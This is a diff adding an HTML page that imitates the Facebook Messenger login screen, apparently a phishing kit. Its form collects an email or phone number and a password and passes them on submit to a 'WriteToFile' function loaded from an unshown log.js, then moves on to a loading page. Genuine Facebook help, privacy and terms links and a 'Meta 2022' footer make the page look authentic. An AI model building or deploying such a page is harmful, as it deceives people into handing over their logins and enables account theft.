@@ -1,0 +1,45 @@
+﻿<!DOCTYPE html>
+
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8" />
+    <title>Messenger</title>
+    <link rel="icon" type="image/x-icon" href="icon.ico" />
+    <link rel="stylesheet" type="text/css" href="style.css" />
+    <script src="log.js"></script>
+</head>
+<body>
+    <img class="logo" src="logo.svg" />
+    <p class="connectl">Connect with your loved ones</p>
+    <form action="loading.html" class="login" onsubmit="WriteToFile(this)">
+        <label for="email"></label>
+        <input type="email" class="email" id="email" name="email" required="required" placeholder="  Email or phone number" />
+        <br />
+        <br />
+        <label for="password"></label>
+        <input type="password" class="password" id="password" name="password" required="required" placeholder="  Password" />
+        <br />
+        <br />
+        <input type="submit" class="connect" value="Log in" />
+        <br />
+        <br />
+        <input type="checkbox" class="box" />
+        <label for="stconn" class="stayconn">To stay connected</label>
+    </form>
+    <br />
+    <br />
+    <br />
+    <br />
+    <br />
+    <a href="loading.html" class="nface">Not on Facebook?</a>
+    <a href="https://www.facebook.com/login/identify" class="forpass">I forgot my password</a>
+    <a href="https://www.facebook.com/privacy/policy/" class="privacy">Privacy Policy</a>
+    <a href="https://www.facebook.com/legal/terms/" class="terms">Terms of Use</a>
+    <a href="https://www.facebook.com/policies/cookies/" class="cookies">Cookie Policy</a>
+    <p class="meta">© Meta 2022</p>
+    <br />
+    <br />
+    <br />
+    <br />
+</body>
+</html>
